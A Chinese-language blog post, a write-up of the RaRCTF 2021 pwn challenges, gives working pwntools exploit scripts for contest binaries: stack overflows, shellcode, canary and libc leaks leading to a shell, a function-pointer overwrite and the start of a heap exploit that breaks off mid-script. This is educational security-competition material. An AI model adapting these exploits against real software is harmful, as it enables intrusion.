<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>RaRCTF-PWN-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直"><meta property="og:image" content><meta property="og:title" content="RaRCTF-PWN-WP"><meta property="og:description" content="一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1532.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-10T10:49:00+00:00"><meta property="article:modified_time" content="2021-08-10T10:49:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="RaRCTF-PWN-WP"><meta name=twitter:description content="一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直"><script src=https://www.cjovi.icu/js/feather.min.js></script><link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.6dc922b4122291f1967a53b3e802e564596ed5068a8571e4221c9ead17563c3a.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>RaRCTF-PWN-WP</h1><div class=meta>Posted on Aug 10, 2021</div></div><section class=body><p>一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。</p><h3 id=archer>Archer</h3><p>这题直接 nc 就可以了</p><h3 id=ret2winrars>ret2winRaRs</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;193.57.159.27&#34;</span>, <span style=color:#4070a0>&#34;30527&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;access:&#34;</span>, <span style=color:#4070a0>&#34;a&#34;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x8</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x0000000000401016</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x401162</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h3 id=not-that-simple>Not That Simple</h3><p>通过这题学到了可以用 getdents 系统调用读取目录中的文件名。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>os <span style=color:#666>=</span> <span style=color:#4070a0>&#39;linux&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>arch <span style=color:#666>=</span> <span style=color:#4070a0>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bss_base <span style=color:#666>=</span> <span style=color:#40a070>0x404108</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./notsimple&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;193.57.159.27&#34;</span>, <span style=color:#4070a0>&#34;37284&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;leaking! &#34;</span>)
</span></span><span style=display:flex><span>stack_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#34;&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x50</span>, <span style=color:#4070a0>&#39;a&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(stack_addr <span style=color:#666>+</span> <span style=color:#40a070>0xA0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x40</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> asm(shellcraft<span style=color:#666>.</span>open(<span style=color:#4070a0>&#39;.&#39;</span>)) 
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> asm(shellcraft<span style=color:#666>.</span>getdents64(<span style=color:#40a070>3</span>, bss_base <span style=color:#666>+</span> <span style=color:#40a070>0x300</span>, <span style=color:#40a070>0x600</span>))
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> asm(shellcraft<span style=color:#666>.</span>write(<span style=color:#40a070>1</span>, bss_base <span style=color:#666>+</span> <span style=color:#40a070>0x300</span>, <span style=color:#40a070>0x600</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h3 id=the-guessing-game>The Guessing Game</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span>from pwn import <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./guess&#34;</span>)
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;193.57.159.27&#34;</span>, <span style=color:#4070a0>&#34;59624&#34;</span>)
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./guess&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.31.so&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>guessed_times <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>one_guess</span>(idx, val):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;guessing (0-7)? &#34;</span>, <span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;guess: &#34;</span>, <span style=color:#007020>str</span>(val))
</span></span><span style=display:flex><span>    back <span style=color:#666>=</span> sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, drop <span style=color:#666>=</span> True)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#    log.success(back + &#34; &#34; + hex(val))</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (back <span style=color:#666>==</span> <span style=color:#4070a0>&#34;You got it!&#34;</span>):
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (back <span style=color:#666>==</span> <span style=color:#4070a0>&#34;Too high!&#34;</span>):
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (back <span style=color:#666>==</span> <span style=color:#4070a0>&#34;Ouch, too low!&#34;</span>):
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>plain_search</span>(idx):
</span></span><span style=display:flex><span>    l, r <span style=color:#666>=</span> <span style=color:#40a070>0</span>, <span style=color:#40a070>255</span>
</span></span><span style=display:flex><span>    mid <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> (l <span style=color:#666>&lt;=</span> r):
</span></span><span style=display:flex><span>        mid <span style=color:#666>=</span> (l <span style=color:#666>+</span> r) <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>        result <span style=color:#666>=</span> one_guess(idx, mid)
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (result <span style=color:#666>==</span> <span style=color:#40a070>0</span>):
</span></span><span style=display:flex><span>            global guessed_times
</span></span><span style=display:flex><span>            guessed_times <span style=color:#666>=</span> guessed_times <span style=color:#666>+</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>return</span> mid
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>elif</span> (result <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>):
</span></span><span style=display:flex><span>            l <span style=color:#666>=</span> mid <span style=color:#666>+</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>:
</span></span><span style=display:flex><span>            r <span style=color:#666>=</span> mid <span style=color:#666>-</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> mid
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>fancy_search</span>(idx):
</span></span><span style=display:flex><span>    l, r <span style=color:#666>=</span> <span style=color:#40a070>0</span>, <span style=color:#40a070>255</span>
</span></span><span style=display:flex><span>    mid <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> (l <span style=color:#666>&lt;=</span> r):
</span></span><span style=display:flex><span>        mid <span style=color:#666>=</span> (l <span style=color:#666>+</span> r) <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>        result <span style=color:#666>=</span> one_guess(idx, mid)
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (result <span style=color:#666>==</span> <span style=color:#40a070>0</span>):
</span></span><span style=display:flex><span>            global guessed_times
</span></span><span style=display:flex><span>            guessed_times <span style=color:#666>=</span> guessed_times <span style=color:#666>+</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>return</span> mid
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>elif</span> (result <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>):
</span></span><span style=display:flex><span>            second_try <span style=color:#666>=</span> one_guess(idx, mid <span style=color:#666>+</span> <span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>if</span> (second_try <span style=color:#666>==</span> <span style=color:#40a070>1</span>):
</span></span><span style=display:flex><span>                <span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;lucky guess!&#34;</span> <span style=color:#666>+</span> hex(mid <span style=color:#666>+</span> <span style=color:#40a070>1</span>))
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> (mid <span style=color:#666>+</span> <span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>elif</span> (second_try <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>):
</span></span><span style=display:flex><span>                l <span style=color:#666>=</span> mid <span style=color:#666>+</span> <span style=color:#40a070>3</span>
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                global guessed_times
</span></span><span style=display:flex><span>                guessed_times <span style=color:#666>=</span> guessed_times <span style=color:#666>+</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> (mid <span style=color:#666>+</span> <span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>:
</span></span><span style=display:flex><span>            second_try <span style=color:#666>=</span> one_guess(idx, mid <span style=color:#666>-</span> <span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>if</span> (second_try <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>):
</span></span><span style=display:flex><span>                <span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;lucky guess!&#34;</span> <span style=color:#666>+</span> hex(mid <span style=color:#666>-</span> <span style=color:#40a070>1</span>))
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> (mid <span style=color:#666>-</span> <span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>elif</span> (second_try <span style=color:#666>==</span> <span style=color:#40a070>1</span>):
</span></span><span style=display:flex><span>                r <span style=color:#666>=</span> mid <span style=color:#666>-</span> <span style=color:#40a070>3</span>
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>else</span>:
</span></span><span style=display:flex><span>                global guessed_times
</span></span><span style=display:flex><span>                guessed_times <span style=color:#666>=</span> guessed_times <span style=color:#666>+</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> (mid <span style=color:#666>-</span> <span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;might failed&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> mid
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>search7byte</span>(start_idx):
</span></span><span style=display:flex><span>    val <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
</span></span><span style=display:flex><span>        val <span style=color:#666>+=</span> <span style=color:#007020>int</span>(fancy_search(start_idx <span style=color:#666>+</span> <span style=color:#40a070>7</span> <span style=color:#666>-</span> i))
</span></span><span style=display:flex><span>        val <span style=color:#666>=</span> val <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> val
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>search6byte</span>(start_idx):
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (guessed_times <span style=color:#666>&gt;</span> <span style=color:#40a070>8</span>):
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>    val <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>6</span>):
</span></span><span style=display:flex><span>        val <span style=color:#666>+=</span> <span style=color:#007020>int</span>(fancy_search(start_idx <span style=color:#666>+</span> <span style=color:#40a070>5</span> <span style=color:#666>-</span> i))
</span></span><span style=display:flex><span>        val <span style=color:#666>=</span> val <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> val <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>canary <span style=color:#666>=</span> search7byte(<span style=color:#40a070>0x20</span>)
</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;canary: &#34;</span> <span style=color:#666>+</span> hex(canary))
</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;guessed_times: &#34;</span> <span style=color:#666>+</span> hex(guessed_times))
</span></span><span style=display:flex><span>_start_addr <span style=color:#666>=</span> search6byte(<span style=color:#40a070>0x10</span>)
</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;_start: &#34;</span> <span style=color:#666>+</span> hex(_start_addr))
</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;guessed_times: &#34;</span> <span style=color:#666>+</span> hex(guessed_times))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span>(guessed_times <span style=color:#666>&lt;</span> <span style=color:#40a070>8</span>):
</span></span><span style=display:flex><span>    plain_search(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>prog_base <span style=color:#666>=</span> _start_addr <span style=color:#666>-</span> <span style=color:#40a070>0x10D0</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x18</span> <span style=color:#666>+</span> p64(canary) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(prog_base <span style=color:#666>+</span> elf<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;_start&#34;</span>])
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;game? &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>global guessed_times
</span></span><span style=display:flex><span>guessed_times <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>__libc_start_main <span style=color:#666>=</span> search6byte(<span style=color:#40a070>0x30</span>) <span style=color:#666>-</span> <span style=color:#40a070>243</span>
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> __libc_start_main <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;__libc_start_main&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#007020>log</span><span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> hex(libc_base))
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span>(guessed_times <span style=color:#666>&lt;</span> <span style=color:#40a070>8</span>):
</span></span><span style=display:flex><span>    plain_search(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x18</span> <span style=color:#666>+</span> p64(canary) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xe6c81</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;game? &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>leak 出 canary，prog_base，libc_base。接下来有 12 字节溢出，onegadget 可行，就可以 getshell 了。</p><h3 id=rarmony>RaRmony</h3><p>一直想着拿 shell，但是实际上只要改自己的权限就可以了</p><p>即修改这个结构体</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>UserRole</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int32</span> idx;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int32</span> roleIdx;
</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> <span style=color:#666>*</span>set_role;
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> name[<span style=color:#40a070>32</span>];
</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> <span style=color:#666>*</span>update_username;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>中的 roleIdx 为 0</p><p>劫持函数指针为 setRole 可以设置</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
</span></span><span style=display:flex><span># coding=utf-8
</span></span><span style=display:flex><span>from pwn import *
</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
</span></span><span style=display:flex><span>context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh = process(&#34;./harmony&#34;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt; &#34;, &#39;3&#39;)
</span></span><span style=display:flex><span>sh.sendafter(&#34;username: &#34;, &#39;\xFF&#39; * 0x20 + p64(0xEE40153B))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt; &#34;, &#39;3&#39;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt; &#34;, &#39;3&#39;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt; &#34;, &#39;3&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt; &#34;, &#39;0&#39;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt; &#34;, &#39;2&#39;)
</span></span><span style=display:flex><span>sh.interactive()
</span></span></code></pre></div><h3 id=return-of-emoji-db>Return of Emoji DB</h3><p>结构体声明如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>typedef</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#06287e>__attribute__</span>((__packed__)) EmojiEntry
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#902000>uint8_t</span> data[<span style=color:#40a070>4</span>];
</span></span><span style=display:flex><span>    <span style=color:#902000>char</span> <span style=color:#666>*</span>title;
</span></span><span style=display:flex><span>} entry;
</span></span></code></pre></div><p>也就是 data 和 title 紧邻</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>write(<span style=color:#40a070>1</span>, entries[index]<span style=color:#666>-&gt;</span>data, count_leading_ones(entries[index]<span style=color:#666>-&gt;</span>data[<span style=color:#40a070>0</span>]));
</span></span><span style=display:flex><span>read(<span style=color:#40a070>0</span>, new_entry<span style=color:#666>-&gt;</span>data <span style=color:#666>+</span> <span style=color:#40a070>1</span>, count_leading_ones(new_entry<span style=color:#666>-&gt;</span>data[<span style=color:#40a070>0</span>]) <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
</span></span></code></pre></div><p>通过上面的 read 可以写 title 指针的低四个字节
write 可以读出低四个字节</p><p>由于是 libc 2.31，所以 double free 可能比较麻烦</p><p>double free 不行就做 chunk overlapping</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(title, data_1, data_7):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&gt; &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;title: &#34;</span>, title)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;emoji: &#34;</span>, data_1)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(data_7)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>read</span>(idx):
